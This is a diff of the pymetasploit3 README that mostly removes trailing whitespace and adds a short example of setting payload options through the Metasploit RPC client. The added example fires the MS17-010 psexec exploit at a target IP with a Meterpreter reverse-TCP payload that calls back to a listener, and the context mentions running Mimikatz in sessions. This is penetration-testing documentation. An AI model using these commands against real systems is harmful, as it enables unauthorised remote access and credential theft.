@@ -15,7 +15,7 @@ Original project  : https://github.com/allfro/pymetasploit
     cd your-project
     pipenv install --three pymetasploit3
     pipenv shell
-    
+
 or:
 
     pip3 install --user pymetasploit3
@@ -54,7 +54,7 @@ $ msfrpcd -P yourpassword -S
 
 ### MsfRpcClient
 
-The `MsfRpcClient` class provides the core functionality to navigate through the Metasploit framework. Use 
+The `MsfRpcClient` class provides the core functionality to navigate through the Metasploit framework. Use
 ```dir(client)``` to see the callable methods.
 
 ```python
@@ -173,13 +173,13 @@ Run the same `exploit` object as before but wait until it completes and gather i
 ```
 
 `client.sessions.session('1')` has the same `.write('some string')` and `.read()` methods, but running session commands and
- waiting until they're done returning output isn't as simple as console commands. The Metasploit RPC server will return 
- a `busy` value that is `True` or `False` with `client.consoles.console('1').is_busy()` but determining if a 
- `client.sessions.session()`  is done running a command requires us to do it by hand. For this purpose we will use a 
- list of strings that, when any one is found in the session's output, will tell us that the session is done running 
- its command. Below we are running the `arp` command within a meterpreter session. We know this command will return one 
- large blob of text that will contain the characters `----` if it's successfully run so we put that into a list object. 
- 
+ waiting until they're done returning output isn't as simple as console commands. The Metasploit RPC server will return
+ a `busy` value that is `True` or `False` with `client.consoles.console('1').is_busy()` but determining if a
+ `client.sessions.session()`  is done running a command requires us to do it by hand. For this purpose we will use a
+ list of strings that, when any one is found in the session's output, will tell us that the session is done running
+ its command. Below we are running the `arp` command within a meterpreter session. We know this command will return one
+ large blob of text that will contain the characters `----` if it's successfully run so we put that into a list object.
+
  ```python
 >>> session_id = '1'
 >>> session_command = 'arp'
@@ -199,8 +199,8 @@ Run a PowerShell script with output
 'Mimikatz output...'
 ```
 
-One can also use a timeout and simply return all data found before the timeout expired. `timeout` defaults to 
-Metasploit's comm timeout of 300s and will throw an exception if the command timed out. To change this, set 
+One can also use a timeout and simply return all data found before the timeout expired. `timeout` defaults to
+Metasploit's comm timeout of 300s and will throw an exception if the command timed out. To change this, set
  `timeout_exception` to `False` and the library will simply return all the data from the session output it found before
  the timeout expired.
  ```python
@@ -211,6 +211,18 @@ Metasploit's comm timeout of 300s and will throw an exception if the command tim
 # 10s pass
 '\nARP Table\n                  ---------------\n  ...`
 ```
+
+### Configuring payload options
+
+For some usecases you might need to specify payload options, here's an example on how to do so.
+
+	exploit = client.modules.use('exploit', 'windows/smb/ms17_010_psexec')
+	exploit['RHOSTS'] = '172.28.128.13'
+	payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
+	payload['LHOST'] = '172.28.128.1'
+	payload['LPORT'] = 4444
+	exploit.execute(payload=payload)
+
 
 ### More examples
 
